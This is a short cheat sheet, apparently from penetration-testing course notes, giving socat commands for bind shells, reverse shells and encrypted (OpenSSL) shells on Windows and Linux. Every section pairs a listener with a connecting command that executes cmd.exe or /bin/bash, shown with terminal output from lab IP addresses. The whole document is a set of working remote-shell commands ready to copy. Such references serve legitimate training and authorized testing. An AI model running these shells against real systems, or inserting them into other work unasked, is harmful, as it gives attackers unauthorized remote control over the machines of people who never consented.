# Cheat Sheet

# socat

## Bind Shell

### Windows

    PS C:\Users\gothburz> .\socat.exe TCP-LISTEN:443,fork EXEC:cmd.exe,pty,stderr,setsid,sigint,sane

    gothburz@kali:~$ socat FILE:`tty`,raw,echo=0 TCP:192.168.134.10:443
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    
    C:\Tools\practical_tools\socat>

### Linux Example

    gothburz@kali:~$ sudo socat TCP-LISTEN:443,fork EXEC:/bin/bash

    PS C:\Users\gothburz> .\socat.exe TCP:192.168.119.134:443 STDOUT
    ip addr | grep tun0
    4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
        inet 192.168.119.134/24 brd 192.168.119.255 scope global tun0

## Reverse Shell

### Windows

    PS C:\Users\gothburz> .\socat.exe TCP:192.168.119.134:443 EXEC:cmd.exe,pty,stderr,setsid,sigint,sane

    gothburz@kali:~$ sudo socat TCP-LISTEN:443 STDOUT
    /bin/bash: line 2: $'\f\fcls': command not found
    2020/02/17 16:12:03 socat[12060] E waitpid(): child 12061 exited with status 127
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    
    C:\Users\gothburz>

### Linux

    PS C:\Tools\practical_tools\socat> .\socat.exe -d -d TCP4-LISTEN:443 STDOUT
    2020/02/17 13:08:17 socat[796] N listening on AF=2 0.0.0.0:443

    gothburz@kali:~/PWK2.0/4-practical-tools/socat$ sudo socat TCP:192.168.134.10:443,fork EXEC:/bin/bash

## Encrypted Bind Shell

### Windows

    PS C:\Tools\practical_tools\socat> .\socat.exe OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:cmd.exe,pty,std
    err,setsid,sigint,sane

    gothburz@kali:~$ socat - OPENSSL:192.168.134.10:443,verify=0
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    
    C:\Users\gothburz>

### Linux

    gothburz@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

    PS C:\Users\gothburz> socat.exe - OPENSSL:192.168.119.134:443,cert=bind_shell.pem,verify=0

## Encrypted Reverse Shell

### Windows

    PS C:\Users\gothburz> .\socat.exe OPENSSL:192.168.119.134:443,cert=bind_shell.pem,verify=0,fork EXEC:cmd.ex
    e,pty,stderr,setsid,sigint,sane

    gothburz@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 STDOUT
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.
    
    C:\Users\gothburz>
    

### Linux

    PS C:\Users\gotburzt> .\socat.exe OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 STDOUT

    gothburz@kali:~$ sudo socat OPENSSL:192.168.134.10:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
